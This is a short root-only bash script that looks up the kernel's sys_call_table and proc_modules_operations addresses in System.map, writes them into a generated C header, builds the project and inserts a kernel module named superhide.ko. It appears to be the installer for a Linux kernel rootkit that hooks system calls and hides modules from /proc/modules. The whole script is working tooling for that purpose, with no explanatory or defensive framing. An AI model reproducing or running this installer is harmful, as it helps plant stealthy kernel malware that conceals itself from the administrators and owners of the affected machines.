#!/bin/bash

RET=0
# require root privs
if [[ $UID != 0 ]]; then
	echo "Please run this script with sudo"
	exit 1
fi

# generate the file we need

smap="/boot/System.map-$(uname -r)"

echo -e "#pragma once" > ./sysgen.h
echo -e "#include <linux/fs.h>" >> ./sysgen.h

symbline=$(cat $smap | grep '\Wsys_call_table$')
set $symbline
echo -e "void** sys_call_table = (void**)0x$1;" >> ./sysgen.h

procline=$(cat $smap | grep '\Wproc_modules_operations$')
set $procline

echo -e "struct file_operations* proc_modules_operations = (struct file_operations*)0x$1;" >> ./sysgen.h

# make it
make

if [ $? -eq 0 ]; then
	# insert the module
	insmod ./superhide.ko
else
	echo "make failed"
	RET=1
fi

exit $RET
